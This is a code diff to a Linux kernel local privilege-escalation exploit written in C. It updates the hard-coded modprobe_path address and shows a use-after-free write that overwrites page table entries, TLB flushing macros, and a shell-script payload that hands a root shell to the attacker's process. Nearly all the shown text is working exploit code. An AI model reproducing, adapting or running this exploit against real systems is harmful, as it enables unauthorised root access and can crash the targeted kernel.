@@ -100,17 +100,14 @@ int act(int act_fd, int code, int n, char *args)
 #define OBJS_PER_SLAB 42
 #define CPU_PARTIAL 120
 
-/*==== Pagetables stuff =====*/
-/* 
- * obtain MODPROBE_PATH_ADDR with `sudo cat /proc/kallsyms| grep modprobe_path`,
- * then cut off `ffffffff8`. Works only without KASLR!
- */
+/* Update the address of modprobe_path for your kernel: */
+#define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
+#define MODPROBE_PATH_ADDR_PART (MODPROBE_PATH_ADDR & 0xffff000lu)
 
-#define MODPROBE_PATH_ADDR 0x35ccc60
-#define MODPROBE_ADDR_ALIGNED (MODPROBE_PATH_ADDR & ~0xFFF)
 #define ENTRIES_AMOUNT 512 /* standart for any pagetable */
 #define PHYS_AREA 0x1000 /* regular page */
 #define PT_FLAGS 0x67 /* RW access for normal users and some sanity flags */
+
 #define _pte_index_to_virt(i) (i << 12)
 #define _pmd_index_to_virt(i) (i << 21)
 #define _pud_index_to_virt(i) (i << 30)
@@ -126,7 +123,6 @@ int act(int act_fd, int code, int n, char *args)
 #define FLUSH_STAT_INPROGRESS 0
 #define FLUSH_STAT_DONE 1
 #define SLEEPLOCK(cmp) while (cmp) { usleep(10 * 1000); }
-/*===========================*/
 
 #define PAYLOAD "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"
 
@@ -415,7 +411,7 @@ int main(void)
 	printf("[!] perform uaf write using the dangling reference\n");
 	printf("[+] attempting to overwrite page table entries. This may kill your kernel.\n");
 
-	long phys_addr = MODPROBE_ADDR_ALIGNED;
+	long phys_addr = MODPROBE_PATH_ADDR_PART;
 	/* doing rewrite to change page table entries */
 	UAF_write(phys_addr, uaf_n, act_fd);
 	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0),0x200000); /* 0x200000 = 4 KiB per 512 pages */
